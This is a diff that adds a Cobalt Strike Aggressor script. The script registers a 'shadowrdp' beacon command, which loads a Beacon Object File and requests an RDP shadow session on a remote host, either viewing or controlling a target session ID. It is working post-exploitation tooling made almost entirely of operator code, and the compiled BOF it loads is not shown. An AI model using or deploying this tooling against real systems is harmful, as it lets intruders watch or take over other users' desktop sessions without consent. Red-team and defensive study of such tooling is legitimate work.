@@ -1,0 +1,74 @@
+#readbof INPUTFILE
+sub readbof
+{
+    local('$barch $bof_filename $handle $data $args');
+    $barch  = barch($1);
+
+    # read in the right BOF file
+    $bof_filename = script_resource("$2 $+ . $+ $barch $+ .bof.o");
+    println("Loading $bof_filename");
+    $handle = openf($bof_filename);
+    $data   = readb($handle, -1);
+    closef($handle);
+    if(strlen($data) == 0)
+    {
+        berror($1, "Could not read BOF file: $bof_filename");
+    }
+
+    btask($1, "Loaded $2 for $barch");
+    return $data;
+}
+
+# subrotine to parse options for script.
+# Returns options as a hash
+sub ops {
+	local('$count');
+	$count = 0;
+	%arguments = ohash();
+	foreach $arg ($1) {
+		if ($count > 0) {
+			if ($arg ismatch '/.*:.*') {
+				$arg = replace($arg, '\A/',"");
+				($key $val) = split(":", $arg, 2);
+				%arguments[$key] = $val;
+			}
+			else if ($arg ismatch '/.*') {
+				$arg = replace($arg, '\A/',"");
+				%arguments[$arg] = "TRUE";
+			}
+			else {
+				%arguments["$count"] = $arg;
+			}
+		}
+		$count = $count + 1;
+	}
+	return (%arguments);
+}
+
+#ShadowRDP
+alias shadowrdp
+{
+    if(size(@_) != 4)
+    {
+        berror($1, beacon_command_detail("shadowrdp"));
+        berror($1, "Invalid number of parameters");
+        return;
+    }
+    $args   = bof_pack($1, "zzz", $2, $3, $4);
+    beacon_inline_execute($1, readbof($1, "shadowrdp"), "go", $args);
+}
+
+beacon_command_register(
+    "shadowrdp",
+    "shadowrdp command",
+    "
+Command: shadowrdp
+Summary: Used to request ShadowRDP session invitation.
+
+Usage:   shadowrdp  <HOSTNAME> [<control>|<view>] <SESSIONID>
+         HOSTNAME           Required. Remote hostname.
+         [<control>|<view>] Required. Control level over remote session. Either 'control' or 'view'.
+         SESSIONID          Required. Target session id.
+                    
+"
+);
